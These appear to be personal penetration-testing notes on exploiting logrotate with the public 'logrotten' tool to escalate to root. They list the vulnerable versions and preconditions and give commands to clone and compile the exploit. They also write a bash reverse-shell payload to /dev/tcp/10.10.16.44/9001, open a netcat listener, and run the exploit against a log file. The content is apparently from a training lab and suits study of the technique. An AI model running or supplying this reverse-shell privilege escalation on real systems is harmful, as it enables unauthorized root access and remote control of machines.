
## logrotten exploit
To exploit `logrotate`, we need some requirements that we have to fulfill.

1. we need `write` permissions on the log files
2. logrotate must run as a privileged user or `root`
3. vulnerable versions:
    - 3.8.6
    - 3.11.0
    - 3.15.0
    - 3.18.0
```shell-session
logger@nix02:~$ git clone https://github.com/whotwagner/logrotten.git
logger@nix02:~$ cd logrotten
logger@nix02:~$ gcc logrotten.c -o logrotten
```
payload
```shell-session
echo 'bash -i >& /dev/tcp/10.10.16.44/9001 0>&1' > payload
```

determine which option `logrotate` uses in `logrotate.conf`.

```shell-session
logger@nix02:~$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"
```
In our case, it is the option: `create`. Therefore we have to use the exploit adapted to this function.
```shell-session
tb]$ nc -nlvp 9001

Listening on 0.0.0.0 9001
```
As a final step, we run the exploit with the prepared payload and wait for a reverse shell as a privileged user or root.

# force log to rotate
```shell-session
./logrotten -p ./payload /tmp/tmp.log
```
![[Pasted image 20250711125537.png]]
```
vipa0z@ubuntu:~$ cp backups/access.log.1 backups/access.log; ./logrotten -p payload  backups/access.log -c ; ls -l /etc/bash_completion.d/

```